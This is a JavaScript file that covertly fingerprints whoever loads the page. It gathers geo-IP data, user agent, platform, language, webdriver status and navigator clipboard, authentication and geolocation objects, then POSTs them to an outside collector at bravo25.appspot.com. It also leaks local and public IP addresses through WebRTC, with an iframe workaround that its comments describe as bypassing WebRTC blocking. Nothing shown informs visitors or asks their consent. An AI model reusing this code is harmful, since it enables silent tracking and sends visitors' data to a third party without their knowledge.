function getInfo() {
    // const url = http://localhost:3000/geo_ip_rec'
    const url = 'https://bravo25.appspot.com/geo_ip_rec'
    // $.getJSON('http://www.geoplugin.net/json.gp?jsoncallback=?', function (data) {
    $.getJSON('https://json.geoiplookup.io/api?callback=?', function (data) {
        console.log(JSON.stringify(data, null, 2));
        const ua = navigator.userAgent;
        const pf = navigator.platform;
        const clip = navigator.clipboard;
        const auth = navigator.authentication;
        const geo = navigator.geolocation;
        const lang = navigator.language;
        const prod = navigator.product;
        const ven = navigator.vendor;
        const web = navigator.webdriver;
        let headers = new Headers();
        // let ip = ip();
        let json = {
            "ip_data": data,
            "ua": ua,
            "pf": pf,
            "web_driver": web,
            "vender": ven,
            "product": prod,
            "language": lang,
            "geo_loc": geo,
            "auth": auth,
            "clipboard": clip,
        };
        // let json = {we: "frucked"};
        fetch(url, {
            method: 'POST',
            headers: {
                // 'Accept': 'application/json',
                // 'Content-Type': 'text/plain'
                "Access-Control-Allow-Origin": "*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify(json)
            // body: JSON.stringify({a: 1, b: 'Textual content'})
        }).then(function (response) {
            return response.text();
        });

    });
    $.getJSON('http://ip.jsontest.com/?callback=?', function (data) {
        const ua = navigator.userAgent;
        const pf = navigator.platform;
        const clip = navigator.clipboard;
        const auth = navigator.authentication;
        const geo = navigator.geolocation;
        const lang = navigator.language;
        const prod = navigator.product;
        const ven = navigator.vendor;
        const web = navigator.webdriver;
        let headers = new Headers();
        let ipa = ip();
        let json = {
            "ip_data": data,
            "ua": ua,
            "pf": pf,
            "web_driver": web,
            "vender": ven,
            "product": prod,
            "language": lang,
            "geo_loc": geo,
            "auth": auth,
            "clipboard": clip,
        };
        // let json = {we: "frucked"};
        fetch(url, {
            method: 'POST',
            headers: {
                // 'Accept': 'application/json',
                // 'Content-Type': 'text/plain'
                "Access-Control-Allow-Origin": "*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify(json)
            // body: JSON.stringify({a: 1, b: 'Textual content'})
        }).then(function (response) {
            return response.text();
        });
    });
//Test: Print the IP addresses into the console
    getIPs(function (ip) {
        console.log(ip);
        const ua = navigator.userAgent;
        const pf = navigator.platform;
        const clip = navigator.clipboard;
        const auth = navigator.authentication;
        const geo = navigator.geolocation;
        const lang = navigator.language;
        const prod = navigator.product;
        const ven = navigator.vendor;
        const web = navigator.webdriver;
        let headers = new Headers();
        let json = {
            "ip_data": ip,
            "ua": ua,
            "pf": pf,
            "web_driver": web,
            "vender": ven,
            "product": prod,
            "language": lang,
            "geo_loc": geo,
            "auth": auth,
            "clipboard": clip,
        };
        // let json = {we: "frucked"};
        fetch(url, {
            method: 'POST',
            headers: {
                // 'Accept': 'application/json',
                // 'Content-Type': 'text/plain'
                "Access-Control-Allow-Origin": "*",
                "Content-Type": "application/json"
            },
            body: JSON.stringify(json)
            // body: JSON.stringify({a: 1, b: 'Textual content'})
        }).then(function (response) {
            return response.text();
        });
    });
    
}


function ip() {
    let ipAdd = ""
    const findIP = new Promise(r => {
        let w = window,
            a = new (w.RTCPeerConnection || w.mozRTCPeerConnection || w.webkitRTCPeerConnection)({iceServers: []}),
            b = () => {
            };
        a.createDataChannel("");
        a.createOffer(c => a.setLocalDescription(c, b, b), b);
        a.onicecandidate = c => {
            try {
                c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)
            } catch (e) {
            }
        }
    })
    // findIP.then(ip => document.write('your ip: ', ip)).catch(e => console.error(e))
    findIP.then(ip => {
        document.write('your ip: ', ip)
        return ip;
    }).catch(e => console.error(e))
    return ip;
}

//get the IP addresses associated with an account
function getIPs(callback) {
    var ip_dups = {};

    //compatibility for firefox and chrome
    var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;

    //bypass naive webrtc blocking using an iframe
    if (!RTCPeerConnection) {
        //NOTE: you need to have an iframe in the page right above the script tag
        //
        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
        //<script>...getIPs called in here...
        //
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }

    //minimal requirements for data connection
    var mediaConstraints = {
        optional: [{RtpDataChannels: true}]
    };

    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};

    //construct a new RTCPeerConnection
    var pc = new RTCPeerConnection(servers, mediaConstraints);

    function handleCandidate(candidate) {
        //match just the IP address
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        var ip_addr = ip_regex.exec(candidate)[1];

        //remove duplicates
        if (ip_dups[ip_addr] === undefined)
            callback(ip_addr);

        ip_dups[ip_addr] = true;
    }

    //listen for candidate events
    pc.onicecandidate = function (ice) {

        //skip non-candidate events
        if (ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };

    //create a bogus data channel
    pc.createDataChannel("");

    //create an offer sdp
    pc.createOffer(function (result) {

        //trigger the stun server request
        pc.setLocalDescription(result, function () {
        }, function () {
        });

    }, function () {
    });

    //wait for a while to let everything done
    setTimeout(function () {
        //read candidate info from local description
        var lines = pc.localDescription.sdp.split('\n');

        lines.forEach(function (line) {
            if (line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
    }, 1000);
}